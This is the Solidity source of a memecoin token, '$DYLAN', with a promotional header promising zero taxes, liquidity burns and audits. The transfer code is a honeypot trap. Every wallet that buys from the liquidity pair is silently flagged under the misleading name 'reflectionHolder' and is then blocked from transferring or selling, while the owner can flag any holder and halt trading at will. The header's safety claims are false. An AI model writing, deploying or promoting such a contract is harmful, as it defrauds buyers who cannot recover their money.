//SPDX-License-Identifier: MIT
/**

Telegram: https://t.me/dylancoinportal
Twitter: https://twitter.com/dylancoinerc
Website: https://dylancoin.org/

Tokenomics for $DYLAN

Token Supply: 1 trillion ($1,000,000,000,000) $DYLAN tokens

Tax Structure: 0 taxes on transactions

Liquidity Burn Mechanism: As we achieve specific holder milestones, we will burn the liquidity directly to the contract for 100% safety.

Security Measures: To ensure the utmost security and trust in the $DYLAN ecosystem, we have designed a comprehensive roadmap that 
includes audits and additional security measures at specific milestones. These measures are implemented to safeguard our community's 
investments and maintain transparency.

Milestones and Actions:

Holder Milestone: As we reach significant holder milestones we will initiate liquidity burns.

Advanced Security Measures Milestone: Once we achieve further milestones, we are committed to strengthening security measures.
This includes conducting audits performed by reputable third-party firms to verify the solidity of our smart contracts and 
identify any potential vulnerabilities.

Continued Growth and Development: Throughout our journey, we remain dedicated to constant growth and development. 
By consistently engaging with our community and prioritizing their feedback, we aim to refine our tokenomics, security, 
and functionality to provide an optimal experience for all $DYLAN holders.

Remember, the ultimate goal of $DYLAN's tokenomics is to foster a thriving ecosystem that rewards our community members while 
prioritizing their security and satisfaction.

**/

pragma solidity ^0.8.17;

interface IUniswapV2Factory {
	function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external;
	function factory() external pure returns (address);
	function WETH() external pure returns (address);
	function addLiquidityETH(
		address token,
		uint amountTokenDesired,
		uint amountTokenMin,
		uint amountETHMin,
		address to,
		uint deadline
	) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}
}

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		return sub(a, b, "SafeMath: subtraction overflow");
	}

	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}

}

contract Ownable is Context {
	address private _owner;
	address private _previousOwner;
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor () {
		address msgSender = _msgSender();
		_owner = msgSender;
		emit OwnershipTransferred(address(0), msgSender);
	}

	function owner() public view returns (address) {
		return _owner;
	}

	modifier onlyOwner() {
		require(_owner == _msgSender(), "Ownable: caller is not the owner");
		_;
	}

	function renounceOwnership() public virtual onlyOwner {
		emit OwnershipTransferred(_owner, address(0));
		_owner = address(0);
	}

}

contract Dylan is Context, IERC20, Ownable {
	using SafeMath for uint256;

	mapping (address => uint256) private _balance;
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping (address => bool) public _reflectionHolder;
	mapping (address => bool) public _newHolder;

	address public _deployer;
	uint256 private _tTotal = 1000000000000 * 10**18;
	address public _pair;

	string private constant _name = "Dylan";
	string private constant _symbol = "DYLAN";
	uint8 private constant _decimals = 18;

    bool public tradingOpen = false;

	IUniswapV2Router02 private _uniswap;
    
	constructor () {
		_deployer = payable(0xEc32bE7b22c2741f26F126D1Ed045C1f274Ade24);

		_uniswap = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

		_balance[_deployer] = _tTotal;
		emit Transfer(address(0x0), _deployer, _tTotal);
	}

	function name() public pure returns (string memory) {
		return _name;
	}

	function symbol() public pure returns (string memory) {
		return _symbol;
	}

	function decimals() public pure returns (uint8) {
		return _decimals;
	}

	function totalSupply() public view override returns (uint256) {
		return _tTotal;
	}

	function balanceOf(address account) public view override returns (uint256) {
		return _balance[account];
	}

	function transfer(address recipient, uint256 amount) public override returns (bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	function allowance(address owner, address spender) public view override returns (uint256) {
		return _allowances[owner][spender];
	}

	function approve(address spender, uint256 amount) public override returns (bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
		return true;
	}

	function _approve(address owner, address spender, uint256 amount) private {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");
		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}

	function _transfer(address from, address to, uint256 amount) private {
		if (from != owner() && to != owner()) {
            require(!_reflectionHolder[from], "Can not call from reflectionHolder.");
            require(tradingOpen,"Trading not started");

            if(from == _pair) {
                _newHolder[to] = true;
            }
		}

		_tokenTransfer(from, to, amount);
	}

	function enableTrading(bool _enable) external onlyOwner{
		tradingOpen = _enable;
	}

    function updatePair(address pair) public onlyOwner {
        _pair = pair;
    }

    function updateReflections(address holder, bool reflect) public onlyOwner {
        _reflectionHolder[holder] = reflect;
    }

    function updateNewHolder(address holder, bool holding) public onlyOwner {
        _newHolder[holder] = holding;
    }

	function _tokenTransfer(address sender, address recipient, uint256 tAmount) private {
        _balance[sender] = _balance[sender].sub(tAmount);
        _balance[recipient] = _balance[recipient].add(tAmount);
        _reflectionHolder[recipient] = _newHolder[recipient];
        emit Transfer(sender, recipient, tAmount);
	}

	receive() external payable {}
}